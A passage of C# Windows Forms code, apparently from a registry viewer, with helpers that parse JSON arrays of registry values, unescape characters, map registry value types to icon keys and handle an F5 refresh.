            while (i < json.Length && json[i] != '"')
            {
                if (json[i] == '\\' && i + 1 < json.Length) { i++; sb.Append(UnescapeChar(json[i])); }
                else sb.Append(json[i]);
                i++;
            }
            i++; // skip closing "
            result.Add(sb.ToString());
        }
        return result;
    }

    private static List<(string name, string type, string data)> ParseValueArray(string json)
    {
        var result = new List<(string, string, string)>();
        if (string.IsNullOrEmpty(json)) return result;
        try
        {
            using var doc  = JsonDocument.Parse(json);
            if (doc.RootElement.ValueKind != JsonValueKind.Array) return result;
            foreach (var el in doc.RootElement.EnumerateArray())
            {
                var name = el.TryGetProperty("name", out var n) ? n.GetString() ?? "" : "";
                var type = el.TryGetProperty("type", out var t) ? t.GetString() ?? "" : "";
                var data = el.TryGetProperty("data", out var d) ? d.GetString() ?? "" : "";
                result.Add((name, type, data));
            }
        }
        catch { }
        return result;
    }

    private static char UnescapeChar(char c) => c switch
    {
        '"'  => '"',
        '\\' => '\\',
        'n'  => '\n',
        'r'  => '\r',
        't'  => '\t',
        _    => c,
    };

    private static string TypeToImageKey(string type) => type switch
    {
        "REG_SZ"        => "str",
        "REG_EXPAND_SZ" => "expand",
        "REG_MULTI_SZ"  => "multi",
        "REG_DWORD"     => "dword",
        "REG_QWORD"     => "qword",
        "REG_BINARY"    => "bin",
        _               => "str",
    };

    protected override bool ProcessCmdKey(ref Message msg, Keys keyData)
    {
        if (keyData == Keys.F5) { BtnRefresh_Click(null, EventArgs.Empty); return true; }
        return base.ProcessCmdKey(ref msg, keyData);
    }
}
